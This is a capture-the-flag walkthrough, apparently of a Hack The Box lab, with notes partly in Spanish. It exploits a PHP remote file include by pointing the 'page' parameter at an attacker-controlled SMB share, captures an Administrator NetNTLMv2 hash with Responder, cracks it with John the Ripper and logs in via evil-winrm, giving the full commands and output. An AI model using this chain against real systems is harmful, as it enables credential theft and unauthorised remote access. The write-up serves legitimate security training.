10.129.21.15


TASK 1

How many TCP ports are open on the machine?
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


TASK 2

When visiting the web service using the IP address, what is the domain that we are being redirected to?
unika.htb

TASK 3

Which scripting language is being used on the server to generate webpages?
php

TASK 4

What is the name of the URL parameter which is used to load different language versions of the webpage?
page

TASK 5

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
../../../../../../../../windows/system32/drivers/etc/hosts
TASK 6

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe
//10.10.14.6/somefile

TASK 7

What does NTLM stand for?
New Technology LAN Manager

TASK 8

Which flag do we use in the Responder utility to specify the network interface?
-I

TASK 9

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
john the ripper


https://github.com/lgandx/Responder
http://unika.htb/index.php?page=//10.10.15.208/somefile 
Con el servidor Responder listo, le decimos al servidor que incluya un recurso de nuestro servidor SMB configurando
el parámetro de la página de la siguiente manera a través del navegador web.
En este caso, debido a que tenemos la libertad de especificar la dirección para el recurso compartido SMB, especificamos la IP
dirección de nuestra máquina atacante. Ahora el servidor intenta cargar el recurso desde nuestro servidor SMB y
Responder captura suficiente de eso para obtener NetNTLMv2.
En el archivo de configuración de PHP php.ini, el envoltorio "allow_url_include" está configurado en "Desactivado" de forma predeterminada, lo que indica que
PHP no carga URL HTTP o FTP remotas para evitar ataques de inclusión de archivos remotos. Sin embargo, incluso si
allow_url_include y allow_url_fopen están configurados en "Off", PHP no evitará la carga de URL de SMB.

[+]RESPONDER[+]
sudo python3 Responder.py -I tun0

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : ::ffff:10.129.225.3
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:3483d83c876f1b90:CF1A01D7300096A28779E1B2C8856E3E:01010000000000000057BE63765ED8018F1C0B42931440F2000000000200080056004E004600300001001E00570049004E002D004B00560057005700360039003600480047004A00360004003400570049004E002D004B00560057005700360039003600480047004A0036002E0056004E00460030002E004C004F00430041004C000300140056004E00460030002E004C004F00430041004C000500140056004E00460030002E004C004F00430041004C00070008000057BE63765ED801060004000200000008003000300000000000000001000000002000008DDA5DDF3192F6FDAB1E0D261BC9D7BE720C1DAF480637CD7F0DFCD9424EC3400A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200300038000000000000000000

echo "$HASHNTLMv2" > hash
[+]JOHN THE RIPPER[+]
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
badminton        (Administrator)


[+]EVIL WINRM[+]
./evil-winrm.rb -i 10.129.225.3 -u Administrator -P 5985 -p badminton

*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac

P0wN3d






